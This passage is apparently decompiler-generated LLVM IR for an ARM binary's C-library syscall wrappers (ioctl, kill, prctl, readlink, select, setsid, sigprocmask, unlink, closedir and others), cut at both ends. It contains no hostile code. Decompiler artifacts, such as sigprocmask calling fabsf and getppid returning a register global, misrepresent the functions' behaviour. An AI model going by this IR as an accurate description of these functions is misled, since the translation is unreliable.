  uselistorder i32 %v0_1103c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_10fd0, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 2, 7, 6, 0, 1 }
  uselistorder label %dec_label_pc_11078, { 1, 0 }
  uselistorder label %dec_label_pc_1106c, { 1, 0 }
  uselistorder label %dec_label_pc_1102c, { 1, 0 }
  uselistorder label %dec_label_pc_11024, { 1, 0 }
}

define i32 @getppid() local_unnamed_addr {
entry:
  %v1_110ac = load i32, i32* @r0, align 4
  ret i32 %v1_110ac
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v9_110b0 = load i32, i32* @r3, align 4
  store i32 %v9_110b0, i32* %stack_var_-4, align 4
  %v3_110b4 = load i32, i32* @r4, align 4
  store i32 %v3_110b4, i32* %stack_var_-32, align 4
  %v6_110b4 = load i32, i32* @r5, align 4
  %v12_110b4 = load i32, i32* @r7, align 4
  %v4_110c4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 12776) to i32*), align 4
  %v2_110cc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_110cc, i32* @r3, align 4
  %v2_110d0 = icmp eq i32 %v4_110c4, 0
  %v0_110d8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_110d8, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  br i1 %v2_110d0, label %dec_label_pc_110e8, label %dec_label_pc_11120

dec_label_pc_110e8:                               ; preds = %entry
  %tmp = icmp ult i32 %v0_110d8, -4095
  br i1 %tmp, label %dec_label_pc_11118, label %dec_label_pc_11100

dec_label_pc_11100:                               ; preds = %dec_label_pc_110e8
  %v1_11104 = sub i32 0, %v0_110d8
  %v3_11108 = load i16, i16* @global_var_22068.345, align 2
  %v4_11108 = sext i16 %v3_11108 to i32
  store i32 %v4_11108, i32* @r3, align 4
  %v0_1110c = call i32 @__aeabi_read_tp()
  %v2_11110 = load i32, i32* @r3, align 4
  %v3_11110 = add i32 %v2_11110, %v0_1110c
  %v4_11110 = inttoptr i32 %v3_11110 to i32*
  store i32 %v1_11104, i32* %v4_11110, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11118

dec_label_pc_11118:                               ; preds = %dec_label_pc_110e8, %dec_label_pc_11100
  %v0_11118 = phi i32 [ %v0_110d8, %dec_label_pc_110e8 ], [ -1, %dec_label_pc_11100 ]
  br label %dec_label_pc_1116c

dec_label_pc_11120:                               ; preds = %entry
  %v0_11120 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_11120, i32* %r6.global-to-local, align 4
  %v0_11130 = load i32, i32* @r4, align 4
  store i32 %v0_11130, i32* %r0.global-to-local, align 4
  %tmp15 = icmp ult i32 %v0_11130, -4095
  br i1 %tmp15, label %dec_label_pc_11160, label %dec_label_pc_11148

dec_label_pc_11148:                               ; preds = %dec_label_pc_11120
  %v1_1114c = sub i32 0, %v0_11130
  %v3_11150 = load i16, i16* @global_var_22068.345, align 2
  %v4_11150 = sext i16 %v3_11150 to i32
  store i32 %v4_11150, i32* @r3, align 4
  %v0_11154 = call i32 @__aeabi_read_tp()
  store i32 %v0_11154, i32* %r0.global-to-local, align 4
  %v2_11158 = load i32, i32* @r3, align 4
  %v3_11158 = add i32 %v2_11158, %v0_11154
  %v4_11158 = inttoptr i32 %v3_11158 to i32*
  store i32 %v1_1114c, i32* %v4_11158, align 4
  %v0_11160.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11160

dec_label_pc_11160:                               ; preds = %dec_label_pc_11120, %dec_label_pc_11148
  %v0_11164 = phi i32 [ %v0_11130, %dec_label_pc_11120 ], [ -1, %dec_label_pc_11148 ]
  %v0_11160 = phi i32 [ %v0_11120, %dec_label_pc_11120 ], [ %v0_11160.pre, %dec_label_pc_11148 ]
  store i32 %v0_11160, i32* %r0.global-to-local, align 4
  store i32 %v0_11164, i32* @r7, align 4
  %v1_11168 = call i32 @__libc_disable_asynccancel(i32 %v0_11160)
  store i32 %v1_11168, i32* %r0.global-to-local, align 4
  %v0_1116c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1116c

dec_label_pc_1116c:                               ; preds = %dec_label_pc_11118, %dec_label_pc_11160
  %v0_1116c = phi i32 [ %v0_11118, %dec_label_pc_11118 ], [ %v0_1116c.pre, %dec_label_pc_11160 ]
  store i32 %v0_1116c, i32* %r0.global-to-local, align 4
  %v2_11174 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_11174, i32* @r4, align 4
  store i32 %v6_110b4, i32* @r5, align 4
  store i32 %v12_110b4, i32* @r7, align 4
  ret i32 %v0_1116c

; uselistorder directives
  uselistorder i32 %v0_1116c, { 1, 0 }
  uselistorder i32 %v0_11160, { 1, 0 }
  uselistorder i32 %v0_11130, { 1, 2, 0, 3 }
  uselistorder i32 %v0_110d8, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 7, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_1116c, { 1, 0 }
  uselistorder label %dec_label_pc_11160, { 1, 0 }
  uselistorder label %dec_label_pc_11118, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11190 = load i32, i32* @r7, align 4
  store i32 %v3_11190, i32* %stack_var_-8, align 4
  %v0_1119c = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1119c, -4095
  br i1 %tmp, label %dec_label_pc_111bc, label %dec_label_pc_111a4

dec_label_pc_111a4:                               ; preds = %entry
  %v1_111a8 = sub i32 0, %v0_1119c
  %v3_111ac = load i16, i16* @global_var_22068.345, align 2
  %v4_111ac = sext i16 %v3_111ac to i32
  %v0_111b0 = call i32 @__aeabi_read_tp()
  %v3_111b4 = add i32 %v4_111ac, %v0_111b0
  %v4_111b4 = inttoptr i32 %v3_111b4 to i32*
  store i32 %v1_111a8, i32* %v4_111b4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_111bc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_111bc

dec_label_pc_111bc:                               ; preds = %entry, %dec_label_pc_111a4
  %v1_111c0 = phi i32 [ %v0_1119c, %entry ], [ -1, %dec_label_pc_111a4 ]
  %v2_111bc = phi i32 [ %v3_11190, %entry ], [ %v2_111bc.pre, %dec_label_pc_111a4 ]
  store i32 %v2_111bc, i32* @r7, align 4
  ret i32 %v1_111c0

; uselistorder directives
  uselistorder i32 %v0_1119c, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_111bc, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_111c8 = load i32, i32* @r4, align 4
  store i32 %v3_111c8, i32* %stack_var_-12, align 4
  %v0_111d8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_111d8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_111d8, -4095
  br i1 %tmp, label %dec_label_pc_11200, label %dec_label_pc_111e8

dec_label_pc_111e8:                               ; preds = %entry
  %v0_111ec = call i32 @__aeabi_read_tp()
  %v3_111f0 = load i16, i16* @global_var_22068.345, align 2
  %v4_111f0 = sext i16 %v3_111f0 to i32
  %v0_111f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_111f4 = sub i32 0, %v0_111f4
  store i32 %v1_111f4, i32* %r2.global-to-local, align 4
  %v3_111f8 = add i32 %v4_111f0, %v0_111ec
  %v4_111f8 = inttoptr i32 %v3_111f8 to i32*
  store i32 %v1_111f4, i32* %v4_111f8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11200.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_11200

dec_label_pc_11200:                               ; preds = %entry, %dec_label_pc_111e8
  %v1_11204 = phi i32 [ %v0_111d8, %entry ], [ -1, %dec_label_pc_111e8 ]
  %v2_11200 = phi i32 [ %v3_111c8, %entry ], [ %v2_11200.pre, %dec_label_pc_111e8 ]
  store i32 %v2_11200, i32* @r4, align 4
  ret i32 %v1_11204

; uselistorder directives
  uselistorder i32 %v0_111d8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11200, { 1, 0 }
}

define i32 @readlink(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1120c = load i32, i32* @r7, align 4
  store i32 %v3_1120c, i32* %stack_var_-8, align 4
  %v0_11218 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11218, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_11218, -4095
  br i1 %tmp, label %dec_label_pc_11240, label %dec_label_pc_11228

dec_label_pc_11228:                               ; preds = %entry
  %v0_1122c = call i32 @__aeabi_read_tp()
  %v3_11230 = load i16, i16* @global_var_22068.345, align 2
  %v4_11230 = sext i16 %v3_11230 to i32
  store i32 %v4_11230, i32* @r3, align 4
  %v0_11234 = load i32, i32* @r2, align 4
  %v1_11234 = sub i32 0, %v0_11234
  store i32 %v1_11234, i32* @r2, align 4
  %v3_11238 = add i32 %v4_11230, %v0_1122c
  %v4_11238 = inttoptr i32 %v3_11238 to i32*
  store i32 %v1_11234, i32* %v4_11238, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11240.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11240

dec_label_pc_11240:                               ; preds = %entry, %dec_label_pc_11228
  %v1_11244 = phi i32 [ %v0_11218, %entry ], [ -1, %dec_label_pc_11228 ]
  %v2_11240 = phi i32 [ %v3_1120c, %entry ], [ %v2_11240.pre, %dec_label_pc_11228 ]
  store i32 %v2_11240, i32* @r7, align 4
  ret i32 %v1_11244

; uselistorder directives
  uselistorder i32 %v0_11218, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11240, { 1, 0 }
}

define i32 @__syscall_select() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1124c = load i32, i32* @r4, align 4
  store i32 %v3_1124c, i32* %stack_var_-12, align 4
  %v0_1125c = load i32, i32* @r0, align 4
  store i32 %v0_1125c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1125c, -4095
  br i1 %tmp, label %dec_label_pc_11284, label %dec_label_pc_1126c

dec_label_pc_1126c:                               ; preds = %entry
  %v0_11270 = call i32 @__aeabi_read_tp()
  %v3_11274 = load i16, i16* @global_var_22068.345, align 2
  %v4_11274 = sext i16 %v3_11274 to i32
  %v0_11278 = load i32, i32* %r2.global-to-local, align 4
  %v1_11278 = sub i32 0, %v0_11278
  store i32 %v1_11278, i32* %r2.global-to-local, align 4
  %v3_1127c = add i32 %v4_11274, %v0_11270
  %v4_1127c = inttoptr i32 %v3_1127c to i32*
  store i32 %v1_11278, i32* %v4_1127c, align 4
  %v2_11284.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_11284

dec_label_pc_11284:                               ; preds = %entry, %dec_label_pc_1126c
  %v1_11288 = phi i32 [ %v0_1125c, %entry ], [ -1, %dec_label_pc_1126c ]
  %v2_11284 = phi i32 [ %v3_1124c, %entry ], [ %v2_11284.pre, %dec_label_pc_1126c ]
  store i32 %v2_11284, i32* @r4, align 4
  ret i32 %v1_11288

; uselistorder directives
  uselistorder i32 %v0_1125c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11284, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_11290 = load i32, i32* @r4, align 4
  store i32 %v3_11290, i32* %stack_var_-28, align 4
  %v6_11290 = load i32, i32* @r5, align 4
  %v9_11290 = load i32, i32* @r6, align 4
  %v12_11290 = load i32, i32* @r7, align 4
  %v15_11290 = load i32, i32* @r8, align 4
  %v18_11290 = load i32, i32* @sl, align 4
  %v21_11290 = load i32, i32* @lr, align 4
  %v4_112a0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 12776) to i32*), align 4
  %v2_112a8 = icmp eq i32 %v4_112a0, 0
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_112a8, label %dec_label_pc_112c4, label %entry.dec_label_pc_112d0_crit_edge

entry.dec_label_pc_112d0_crit_edge:               ; preds = %entry
  br label %dec_label_pc_112d0

dec_label_pc_112c4:                               ; preds = %entry
  store i32 %v3_11290, i32* @r4, align 4
  store i32 %v9_11290, i32* @r6, align 4
  store i32 %v12_11290, i32* @r7, align 4
  store i32 %v15_11290, i32* @r8, align 4
  store i32 %v18_11290, i32* %sl.global-to-local, align 4
  %v0_112cc = call i32 @__syscall_select()
  br label %dec_label_pc_112d0

dec_label_pc_112d0:                               ; preds = %entry.dec_label_pc_112d0_crit_edge, %dec_label_pc_112c4
  %v0_112d0 = call i32 @__libc_enable_asynccancel()
  %v0_112d4 = load i32, i32* @r6, align 4
  store i32 %v0_112d4, i32* @r1, align 4
  store i32 %v0_112d0, i32* @r5, align 4
  %v0_112e4 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_112e4, i32* @r0, align 4
  %v0_112ec = call i32 @__syscall_select()
  store i32 %v0_112ec, i32* @r4, align 4
  %v0_112f4 = load i32, i32* @r5, align 4
  %v1_112f8 = call i32 @__libc_disable_asynccancel(i32 %v0_112f4)
  %v0_112fc = load i32, i32* @r4, align 4
  %v2_11304 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_11304, i32* @r4, align 4
  store i32 %v6_11290, i32* @r5, align 4
  store i32 %v9_11290, i32* @r6, align 4
  store i32 %v12_11290, i32* @r7, align 4
  store i32 %v15_11290, i32* @r8, align 4
  store i32 %v18_11290, i32* @sl, align 4
  store i32 %v21_11290, i32* @lr, align 4
  ret i32 %v0_112fc

; uselistorder directives
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_112d0, { 1, 0 }
}

define i32 @__GI_setsid(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11314 = load i32, i32* @r7, align 4
  store i32 %v3_11314, i32* %stack_var_-8, align 4
  %v0_11320 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11320, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11320, -4095
  br i1 %tmp, label %dec_label_pc_11348, label %dec_label_pc_11330

dec_label_pc_11330:                               ; preds = %entry
  %v0_11334 = call i32 @__aeabi_read_tp()
  %v3_11338 = load i16, i16* @global_var_22068.345, align 2
  %v4_11338 = sext i16 %v3_11338 to i32
  %v0_1133c = load i32, i32* %r2.global-to-local, align 4
  %v1_1133c = sub i32 0, %v0_1133c
  store i32 %v1_1133c, i32* %r2.global-to-local, align 4
  %v3_11340 = add i32 %v4_11338, %v0_11334
  %v4_11340 = inttoptr i32 %v3_11340 to i32*
  store i32 %v1_1133c, i32* %v4_11340, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11348.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11348

dec_label_pc_11348:                               ; preds = %entry, %dec_label_pc_11330
  %v1_1134c = phi i32 [ %v0_11320, %entry ], [ -1, %dec_label_pc_11330 ]
  %v2_11348 = phi i32 [ %v3_11314, %entry ], [ %v2_11348.pre, %dec_label_pc_11330 ]
  store i32 %v2_11348, i32* @r7, align 4
  ret i32 %v1_1134c

; uselistorder directives
  uselistorder i32 %v0_11320, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11348, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_11358 = icmp eq i32* %arg2, null
  br i1 %v2_11358, label %dec_label_pc_1139c, label %dec_label_pc_1136c

dec_label_pc_1136c:                               ; preds = %entry
  %v2_1136c = load i32, i32* %arg2, align 4
  %v1_11370 = icmp slt i32 %v2_1136c, 0
  br i1 %v1_11370, label %dec_label_pc_11384, label %dec_label_pc_11378

dec_label_pc_11378:                               ; preds = %dec_label_pc_1136c
  %tmp = ptrtoint i32* %arg2 to i32
  %.pre = add i32 %tmp, 4
  %.pre3 = inttoptr i32 %.pre to i32*
  %v3_11378 = load i32, i32* %.pre3, align 4
  %v1_1137c = urem i32 %v3_11378, 2
  %v2_1137c = icmp eq i32 %v1_1137c, 0
  br i1 %v2_1137c, label %dec_label_pc_1139c, label %dec_label_pc_11384

dec_label_pc_11384:                               ; preds = %dec_label_pc_1136c, %dec_label_pc_11378
  %v2_11384 = load i32, i32* %arg2, align 4
  %tmp9 = bitcast i32 %v2_11384 to float
  %tmp10 = call float @fabsf(float %tmp9)
  br label %dec_label_pc_1139c

dec_label_pc_1139c:                               ; preds = %dec_label_pc_11378, %entry, %dec_label_pc_11384
  %tmp11 = icmp ult i32 %arg1, -4095
  br i1 %tmp11, label %dec_label_pc_113d0, label %dec_label_pc_113b8

dec_label_pc_113b8:                               ; preds = %dec_label_pc_1139c
  %v1_113bc = sub i32 0, %arg1
  %v3_113c0 = load i16, i16* @global_var_22068.345, align 2
  %v4_113c0 = sext i16 %v3_113c0 to i32
  %v0_113c4 = call i32 @__aeabi_read_tp()
  %v3_113c8 = add i32 %v4_113c0, %v0_113c4
  %v4_113c8 = inttoptr i32 %v3_113c8 to i32*
  store i32 %v1_113bc, i32* %v4_113c8, align 4
  br label %dec_label_pc_113d0

dec_label_pc_113d0:                               ; preds = %dec_label_pc_1139c, %dec_label_pc_113b8
  %v1_113d8 = phi i32 [ %arg1, %dec_label_pc_1139c ], [ -1, %dec_label_pc_113b8 ]
  ret i32 %v1_113d8

; uselistorder directives
  uselistorder i32* %arg2, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_113d0, { 1, 0 }
  uselistorder label %dec_label_pc_1139c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11384, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_113e4 = ptrtoint i32* %stack_var_-16 to i32
  store i32 0, i32* @r1, align 4
  %v2_113f4 = call i32 @gettimeofday(i32 %v2_113e4, i32 0)
  %v2_113f8 = load i32, i32* %stack_var_-16, align 4
  %v2_113fc = icmp eq i32* %arg1, null
  br i1 %v2_113fc, label %bb6, label %bb

bb:                                               ; preds = %entry
  store i32 %v2_113f8, i32* %arg1, align 4
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  ret i32 %v2_113f8

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @unlink(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11410 = load i32, i32* @r7, align 4
  store i32 %v3_11410, i32* %stack_var_-8, align 4
  %v0_1141c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1141c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1141c, -4095
  br i1 %tmp, label %dec_label_pc_11444, label %dec_label_pc_1142c

dec_label_pc_1142c:                               ; preds = %entry
  %v0_11430 = call i32 @__aeabi_read_tp()
  %v3_11434 = load i16, i16* @global_var_22068.345, align 2
  %v4_11434 = sext i16 %v3_11434 to i32
  %v0_11438 = load i32, i32* %r2.global-to-local, align 4
  %v1_11438 = sub i32 0, %v0_11438
  store i32 %v1_11438, i32* %r2.global-to-local, align 4
  %v3_1143c = add i32 %v4_11434, %v0_11430
  %v4_1143c = inttoptr i32 %v3_1143c to i32*
  store i32 %v1_11438, i32* %v4_1143c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11444.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11444

dec_label_pc_11444:                               ; preds = %entry, %dec_label_pc_1142c
  %v1_11448 = phi i32 [ %v0_1141c, %entry ], [ -1, %dec_label_pc_1142c ]
  %v2_11444 = phi i32 [ %v3_11410, %entry ], [ %v2_11444.pre, %dec_label_pc_1142c ]
  store i32 %v2_11444, i32* @r7, align 4
  ret i32 %v1_11448

; uselistorder directives
  uselistorder i32 %v0_1141c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11444, { 1, 0 }
}

define i32 @__GI_closedir(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_11450 = load i32, i32* @r4, align 4
  store i32 %v3_11450, i32* %stack_var_-24, align 4
  %v9_11450 = load i32, i32* @r6, align 4
  %v12_11450 = load i32, i32* @r7, align 4
  %v15_11450 = load i32, i32* @r8, align 4
  %v18_11450 = load i32, i32* @lr, align 4
  %v2_11454 = load i32, i32* %arg1, align 4
  store i32 %v2_11454, i32* %r3.global-to-local, align 4
  %v3_1145c = icmp eq i32 %v2_11454, -1
  store i32 %tmp, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* @r6, align 4
  br i1 %v3_1145c, label %dec_label_pc_11470, label %dec_label_pc_1148c

dec_label_pc_11470:                               ; preds = %entry
  store i32 68584, i32* %r2.global-to-local, align 4
  %v0_11474 = call i32 @__aeabi_read_tp()
  %v3_11478 = load i16, i16* @global_var_22068.345, align 2
  %v4_11478 = sext i16 %v3_11478 to i32
  store i32 %v4_11478, i32* %r2.global-to-local, align 4
  %v0_1147c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_1147c, i32* %r1.global-to-local, align 4
  %v1_11480 = add i32 %v0_1147c, 10
  store i32 %v1_11480, i32* %r3.global-to-local, align 4
  %v3_11484 = add i32 %v4_11478, %v0_11474
  %v4_11484 = inttoptr i32 %v3_11484 to i32*
  store i32 %v1_11480, i32* %v4_11484, align 4
  %v0_11534.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11534

dec_label_pc_1148c:                               ; preds = %entry
  store i32 68, i32* %r3.global-to-local, align 4
  %v1_11490 = add i32 %tmp, 24
  store i32 %v1_11490, i32* %r2.global-to-local, align 4
  %v4_11498 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 68) to i32*), align 4
  store i32 %v4_11498, i32* %r1.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_114a4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_114a4)
  store i32 -1, i32* @r8, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_114bc = load i32, i32* @r6, align 4
  %v2_114bc = add i32 %v0_114bc, 16
  %v3_114bc = inttoptr i32 %v2_114bc to i32*
  %v4_114bc = load i32, i32* %v3_114bc, align 4
  call void @__pseudo_branch(i32 %v4_114bc)
  %v0_114c8 = load i32, i32* @r7, align 4
  %v1_114c8 = inttoptr i32 %v0_114c8 to i32*
  %v2_114c8 = load i32, i32* %v1_114c8, align 4
  store i32 %v2_114c8, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_114d8 = load i32, i32* @r8, align 4
  store i32 %v0_114d8, i32* %v1_114c8, align 4
  %v0_114dc = load i32, i32* @r6, align 4
  %v1_114dc = load i32, i32* %r3.global-to-local, align 4
  %v2_114dc = add i32 %v1_114dc, %v0_114dc
  %v3_114dc = inttoptr i32 %v2_114dc to i32*
  %v4_114dc = load i32, i32* %v3_114dc, align 4
  store i32 ptrtoint (i32* @global_var_114e8.373 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_114dc)
  %v0_114e8 = load i32, i32* @r7, align 4
  %v1_114e8 = add i32 %v0_114e8, 12
  %v2_114e8 = inttoptr i32 %v1_114e8 to i32*
  %v3_114e8 = load i32, i32* %v2_114e8, align 4
  store i32 %v3_114e8, i32* @r0, align 4
  %v0_114ec = call i32 @free()
  %v0_114f0 = load i32, i32* @r7, align 4
  store i32 %v0_114f0, i32* @r0, align 4
  %v0_114f4 = call i32 @free()
  %v0_114fc = load i32, i32* @r4, align 4
  store i32 %v0_114fc, i32* %r2.global-to-local, align 4
  %tmp11 = icmp ult i32 %v0_114fc, -4095
  br i1 %tmp11, label %dec_label_pc_11530, label %dec_label_pc_11518

dec_label_pc_11518:                               ; preds = %dec_label_pc_1148c
  store i32 68416, i32* %r3.global-to-local, align 4
  %v0_1151c = call i32 @__aeabi_read_tp()
  %v3_11520 = load i16, i16* @global_var_22068.345, align 2
  %v4_11520 = sext i16 %v3_11520 to i32
  store i32 %v4_11520, i32* %r3.global-to-local, align 4
  %v0_11524 = load i32, i32* %r2.global-to-local, align 4
  %v1_11524 = sub i32 0, %v0_11524
  store i32 %v1_11524, i32* %r2.global-to-local, align 4
  %v3_11528 = add i32 %v4_11520, %v0_1151c
  %v4_11528 = inttoptr i32 %v3_11528 to i32*
  store i32 %v1_11524, i32* %v4_11528, align 4
  %v0_1152c = load i32, i32* @r8, align 4
  br label %dec_label_pc_11530

dec_label_pc_11530:                               ; preds = %dec_label_pc_1148c, %dec_label_pc_11518
  %v0_11530 = phi i32 [ %v0_114fc, %dec_label_pc_1148c ], [ %v0_1152c, %dec_label_pc_11518 ]
  store i32 %v0_11530, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11534

dec_label_pc_11534:                               ; preds = %dec_label_pc_11470, %dec_label_pc_11530
  %v0_11534 = phi i32 [ %v0_11534.pre, %dec_label_pc_11470 ], [ %v0_11530, %dec_label_pc_11530 ]
  %v2_1153c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1153c, i32* @r4, align 4
  store i32 %v9_11450, i32* @r6, align 4
  store i32 %v12_11450, i32* @r7, align 4
  store i32 %v15_11450, i32* @r8, align 4
  store i32 %v18_11450, i32* @lr, align 4
  ret i32 %v0_11534

; uselistorder directives
  uselistorder i32 %v0_114fc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11534, { 1, 0 }
  uselistorder label %dec_label_pc_11530, { 1, 0 }
}

define i32 @function_1154c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1154c:
  %v0_1154c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1154c, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_1154c
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1154c, %bb
  %v7_1155c = phi i32 [ %arg1, %dec_label_pc_1154c ], [ 0, %bb ]
  ret i32 %v7_1155c

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @fd_to_DIR(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_11560 = load i32, i32* @r4, align 4
  %v6_11560 = load i32, i32* @r5, align 4
  %v9_11560 = load i32, i32* @r6, align 4
  %v12_11560 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 48, i32* @r0, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_11574 = call i32 @malloc()
  %v2_1157c = icmp eq i32 %v0_11574, 0
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* @r6, align 4
  br i1 %v2_1157c, label %bb, label %dec_label_pc_1158c

bb:                                               ; preds = %entry
  br label %dec_label_pc_11618

dec_label_pc_1158c:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_11590 = load i32, i32* @r4, align 4
  %v2_11590 = icmp ugt i32 %v0_11590, 511
  %v2_11594 = add i32 %v0_11574, 4
  %v3_11594 = inttoptr i32 %v2_11594 to i32*
  store i32 0, i32* %v3_11594, align 4
